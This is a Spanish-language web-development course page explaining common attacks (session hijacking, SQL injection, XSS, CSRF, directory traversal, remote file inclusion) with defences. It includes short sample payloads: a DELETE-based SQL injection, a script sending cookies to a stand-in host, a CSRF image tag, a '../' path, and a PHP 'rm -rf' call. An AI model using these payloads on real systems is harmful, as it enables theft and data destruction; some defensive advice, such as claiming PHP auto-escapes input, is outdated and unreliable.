---
layout: page
title: 3.4 Técnicas de ataque frecuentes
permalink: /cookies-sesiones-seguridad/tecnicas-de-ataque-frecuentes.html
nav_order: 1
has_children: false
parent: 3 Cookies, sesiones y seguridad
grand_parent: Desarrollo Web en Entorno Servidor
---

## 3.4. Técnicas de ataque frecuentes
{: .no_toc }

- TOC
{:toc}

Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que esté *online* acaba por ser atacada. Es una certeza matemática.

En esta sección vamos a describir qué tipos de ataque son los más frecuentes.

Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una idea común a todas: lo más seguro es utilizar un *framework* como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.

Aún así, conviene que conozcas con qué tipos de ataque te vas a encontrar y cuales son las formas de defenderse de ellos.

(Esta sección está adaptada de [securitybydefault.com](securitybydefault.com))

### 3.4.1. Captura de ID de sesión

Como ya hemos visto, el ID de una sesión se guarda como una *cookie* (llamada generalmente *phpsessid*) en el cliente para distinguir a ese cliente de otros a la hora de acceder a las variables de sesión. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.

Un atacante que esté escuchando en esa red puede **leer la cookie con el ID de sesión del paquete http** y, de ese modo, **suplantar la identidad** de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados.

Por último, si el atacante consigue tener acceso, aunque sea por unos minutos, al ordenador de su víctima, puede robar el ID de sesión (que en el cliente siempre se almacena como texto plano) y suplantarlo con toda comodidad.

Soluciones:

* Combinar las variables de sesión con *cookies* o con entradas en la base de datos.
* Cambiar el ID de sesión periódicamente.
* No confiar en variables de sesión de PHP para almacenar información muy sensible.
* Denegar el acceso a la *cookie* de sesión desde Javascript (usando el atributo *httponly*).
* Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador. Este es uno de los muchos motivos por los que https se ha impuesto definitivamente a lo largo y ancho de la web.

### 3.4.2. Inyección de SQL

Este ataque consiste en que **un usuario malintencionado ejecuta sentencias SQL contra la base de datos** del sitio web mediante el simple procedimiento de insertarlas en un formulario.

¿Qué cómo narices se hace eso? Te lo explico con un ejemplo. Imagina que nuestro atacante ha hecho la suposición de que nuestra tabla de usuarios se llama *users* (una suposición muy razonable). Entonces, el tío, o la tía, llega al formulario de login de la aplicación, donde se nos pide el *nick* y la contraseña, y escribe esto en el campo *nick*:

![Ataque por inyección SQL](/docs/dwes/_site/assets/images/03-formulario-inyeccion-sql.png)

Cuando pulse el botón *"Sign in"* ocurrirá algo muy curioso... y muy desagradable. Dentro de nuestro código fuente, seguramente tendremos una línea parecida a esta:

<code>
$sql = "SELECT * FROM users WHERE nick = '$nick' and passwd = '$pass'";
</code>

Fíjate otra vez en lo que el atacante ha escrito en el campo *nick* del formulario de login. Eso significa que la variable *$nick* tendrá este contenido: ```nada'; DELETE * FROM users; #```. Imagina lo que va a suceder cuando esa variable se expanda dentro de la sentencia SQL anterior.

¿Te lo has imaginado ya? 

Por si acaso aún no lo has pillado, te lo chivo. Lo que sucederá es que, al expandir la variable *$nick* en ese string, la variable *$sql* pasará a tener este valor:

<code>
SELECT * FROM users WHERE nick ='<strong>nada';
DELETE * FROM users;
#</strong>'and passwd = '$pass'
</code>

(He puesto en negrita el contenido de la variable *$nick* expandido dentro del string *$sql*)

Es decir, que el atacante ha logrado convertir un inofensivo *SELECT* en una secuencia de dos instrucciones. Y una de ellas no es nada inofensiva.

En efecto, cuando pidamos a la base de datos que ejecute ese SQL, las sentencias se ejecutarán en orden. El primer SELECT no devolverá ningún resultado, pero es sintácticamente correcto y, en cualquier caso, al atacante no le interesan esos resultados.

Como el SELECT es sintácticamente correcto, la base de datos no se detendrá ahí, sino que seguirá ejecutando las sentencias. Y le llegará el turno al DELETE. ¡Bingo! El simpático atacante acaba de cepillarse nuestra tabla de usuarios.

(Lo que haya a continuación del símbolo # se ignorará, porque ese es el símbolo de comentario en SQL).

El atacante no solo puede ejecutar un DELETE mediante este sencillo procedimiento, sino que puede llevar a cabo otras acciones destructivas (¿qué tal un DROP DATABASE?) o instrusivas (puede intentar insertar un usuario administrador fraudulento en la tabla *users*, por ejemplo). Y todo ello partiendo de una suposición bastante plausible: que la tabla de usuarios se llama *users*.

Para blindarse frente a inyecciones de SQL, se recomienda:

* **Filtrar los datos procedentes de los formularios. SIEMPRE**. Por ejemplo, si los nombres de usuario sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc. Vimos cómo se valida y se sanea un formulario en el tema anterior.
* **Escapar los caracteres especiales** de cualquier dato de entrada antes de enviarlo al gestor de bases de datos. Por ejemplo, *mysql_real_escape_string()* coloca barras invertidas antes de ciertos caracteres. *addslashes()* hace algo parecido. Esto hace que ya no se ejecuten como sentencias SQL. En las versiones recientes de PHP, el escape de caracteres especiales se hace automáticamente con cualquier dato que llegue por GET o POST.
* **Usar nombres poco habituales para las tablas** de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como *users* para la tabla de usuarios) y añadirle varios caracteres o números aleatorios (así, la tabla se convertiría en algo como *users_58283*). Ese sufijo aleatorio se suele almacenar en un archivo de configuración para que esté accesible para todos los scripts del programa. Esta técnica tan simple dificulta enormemente cualquier intento de acceso fraudulento a las tablas.

### 3.4.3. XSS (cross site scripting)

El ataque por XSS consiste en **ejecutar código de scripting malicioso** (básicamente, Javascript) en el contexto del sitio web.

Hay muchas formas de hacer XSS. Por ejemplo, imagínate que tenemos un blog de noticias y que un usuario malicioso publica, *como parte del texto de una entrada*, este string:

```javascript
<script>document.href = 'https://otrositio.com';</script>
```

¿Qué ocurriría? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, será redirigido a *otrositio.com*, donde probablemente pretenderán venderle medicamentos para la disfunción eréctil o algo por el estilo.

Otra cosa que suele hacerse con XSS es robar datos de las *cookies* del cliente, aprovechando que Javascript puede acceder a las *cookies*. Para ello, el atacante solo tiene que inyectar un código como este:

```javascript
<script>document.location = 'https://otrositio.com?cookies=' + document.cookie</script>
```

Para evitar los ataques XSS, la estrategia más útil, otra vez, es **filtrar y validar todos los datos externos**. El filtrado de datos es sencillo de hacer y te ahorrará mogollón de problemas. En resumen: **nunca** te fíes de ningún dato que provenga de un formulario si no lo has saneado antes y le has quitado todos los caracteres sospechosos.

### 3.4.4. CSRF o XSRF (cross site request forgery)

Este tipo de ataques **explota la confianza que tiene un sitio web en la identidad de un usuario**. Es decir, se toma a un usuario válido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com), se le fuerza a hacer algo chungo en sitio-confiable.com.

Veámoslo con un ejemplo. Supón que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario). Este tipo de URLs son muy habituales en las aplicaciones web.

Pues bien, imagina que has abierto una sesión como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante supermalvado, conocedor de tu propensión a navegar por sitios chungos sin cerrar la sesión en sitio-confiable.com, ha colocado este código como parte del código fuente de sitio-maligno.com:

```html
<img src='https://sitio-confiable.com/usuario/delete/28'>
```

Cuando tu navegador cargue esa página, lanzará una petición GET a sitio-confiable.com, resultando en la eliminación del usuario 28 sin que tú te enteres de cómo ha podido suceder semejante desgracia.

Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un montón de cosas desagradables en sitio-confiable.com, porque ese sitio está confiando en ti, que eres un usuario legítimo con una sesión abierta.

Puedes pensar: ¿y quién demonios se va a dejar una sesión abierta y se va a poner a navegar por otros sitios sin cerrarla? Respuesta: *todo* el mundo. Si tú no lo has hecho nunca, aunque solo haya sido una vez, probablemente no perteneces a la especie humana.

Algunas técnicas para dificultar el ataque por CSRF:

* **Utilizar POST en lugar de GET** para recibir datos.
* **Generar tokens únicos para cada petición**. Un tóken es una cadena alfanumérica aleatoria generada por el servidor cuando sirve el código HTML de un formulario. El cliente debe enviar de vuelta ese tóken junto con los datos del formulario para que el servidor acepte la petición como válida. Si un atacante intenta efectuar un ataque CSRF, enviará sus peticiones sin el tóken y serán rechazadas.

### 3.4.5. DT (directory transversal)

Este ataque se produce cuando el atacante logra **acceder a ficheros del servidor que están fuera del directorio de la aplicación** y que, teóricamente, no deberían ser accesibles desde esta.

Es fácil comprender cómo puede montarse un ataque así. Imagina un programa PHP que haga un *include()* de este estilo:

```php
include ("views/" . $viewName);
```

Si un atacante logra manipular la variable *$viewName* para asignarle, por ejemplo, el valor "../../../../otro-fichero.php", nuestro programa hará un include de un fichero que está claramente fuera de los directorios de la aplicación.

Para evitar este tipo de ataques, algunas estrategias son:

* **Tener un array de páginas y carpetas válidas**. Si un include trata de acceder a un recurso que no está en la lista, se sospechará de un ataque.
* **Buscar caracteres sospechosos en los nombres de los archivos**. Es decir, sanear los formularios. Por ejemplo, si la variable *$viewName* del ejemplo anterior incluye los caracteres "../", la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina "ataque punto punto barra".

### 3.4.6. RFI (remote file inclusion)

Este ataque se produce cuando **se incluye un archivo remoto** explotando una vulnerabilidad del código fuente.

Imagina, como antes, un programa PHP que haga un *include()* tan común como este:

```php
include ($viewName);
```

Imagina también que este código se invoque normalmente mediante una petición del estilo: https://sitio-confiable.com?view=main.php. O algo parecido. Es una estrategia habitual en muchas aplicaciones web.

Pues bien, un atacante podría pedir la siguiente URL: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php

Es decir, ha colocado como *$viewName* la URL de un programa PHP externo a nuestro servidor, y nuestro programa hará un *include()* de ese código tan feliz y contento, sin saber que se trata de código malicioso que acabará directamente en las tripas de nuestro programa. 

Una vez que *soy-un-script-malvado.php* se esté ejecutando en el servidor *sitio-confiable.com*, puede hacer cosas terribles, como, por ejemplo, esta:

```php
<?php
  system("rm -rf");
?>
```

(No te digo lo que hace ese comando por si se te ocurre probarlo, pero ya te adelanto que no es agradable).

Para prevenir los ataques por RFI, algunas estrategias válidas son:

* **No confiar en los datos** que no provengan de nuestro sistema.
* **Validar y filtrar los datos** que introduce el usuario (sí, otra vez: validar, validar y validar cualquier cosa que provenga del usuario).
